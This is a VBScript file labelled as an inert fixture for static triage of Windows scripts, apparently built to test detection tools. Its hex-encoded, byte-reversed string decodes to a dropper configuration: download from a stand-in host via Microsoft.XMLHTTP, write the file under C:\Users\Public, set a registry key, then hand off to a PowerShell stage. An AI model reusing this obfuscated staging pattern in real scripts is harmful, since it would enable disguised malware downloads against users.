Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_5c2eff98 = "31-73-70-2e-65-6c-70-6d-61-73-2d-65-63-72-75-6f-73-65-72-3d-65-67-61-74-73-5f-74-78-65-6e-7c-61-36-31-34-66-39-37-61-61-39-5c-65-6c-62-61-73-6f-70-73-69-44-5c-62-61-4c-73-73-65-72-74-6e-75-48-5c-65-72-61-77-74-66-6f-53-5c-55-43-4b-48-3d-68-74-61-70-5f-79-72-74-73-69-67-65-72-7c-74-61-64-2e-61-36-31-34-66-39-37-61-61-39-2d-65-67-61-74-73-5c-62-61-4c-73-73-65-72-74-6e-75-48-5c-63-69-6c-62-75-50-5c-73-72-65-73-55-5c-3a-43-3d-68-74-61-70-5f-65-6c-69-66-7c-61-36-31-34-66-39-37-61-61-39-2f-62-61-4c-73-73-65-72-74-6e-75-48-3d-74-6e-65-67-61-5f-72-65-73-75-7c-74-61-64-2e-66-35-30-31-64-37-66-63-2f-64-69-6c-61-76-6e-69-2e-65-6c-70-6d-61-78-65-2e-61-36-31-34-66-39-37-61-61-39-2f-2f-3a-73-70-74-74-68-3d-6c-72-75-7c-61-36-31-34-66-39-37-61-61-39-2d-6e-67-69-61-70-6d-61-63-3d-64-69-5f-6e-67-69-61-70-6d-61-63-7c-34-3d-74-6e-75-6f-63-5f-65-67-61-74-73-7c-50-54-54-48-4c-4d-58-2e-74-66-6f-73-6f-72-63-69-4d-3d-72-65-74-70-61-64-61-7c-74-70-69-72-63-73-5f-66-66-6f-64-6e-61-68-2c-73-73-65-63-6f-72-70-5f-68-63-74-61-70-73-69-64-2c-65-6c-69-66-5f-65-74-69-72-77-2c-65-74-6f-6d-65-72-5f-65-72-69-75-71-63-61-3d-73-70-65-74-73-7c-31-3d-76"
Const Codec_5c2eff98 = "hex_dash|reverse_bytes|"

Function Load_5c2eff98()
  Dim parts, result(), materialIndex
  parts = Split(Material_5c2eff98, "-")
  ReDim result(UBound(parts))
  For materialIndex = 0 To UBound(parts)
    result(materialIndex) = CInt("&H" & parts(materialIndex))
  Next
  Load_5c2eff98 = result
End Function

Function Decode_5c2eff98(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  For materialIndex = 0 To UBound(storedMaterial)
    result(UBound(storedMaterial) - materialIndex) = storedMaterial(materialIndex)
  Next
  Decode_5c2eff98 = result
End Function

Function Recover_5c2eff98()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  If True Then
    harmlessValue = LCase(UCase("Host"))
      storedMaterial = Load_5c2eff98()
      Select Case 1
        Case 1
          recoveredMaterial = Decode_5c2eff98(storedMaterial)
        Case Else
          recoveredMaterial = Array()
      End Select
      configurationText = ""
      For materialIndex = 0 To UBound(recoveredMaterial)
        configurationText = configurationText & Chr(recoveredMaterial(materialIndex))
      Next
  End If
  Recover_5c2eff98 = configurationText
End Function

Function Inspect_5c2eff98()
  Inspect_5c2eff98 = Recover_5c2eff98()
End Function
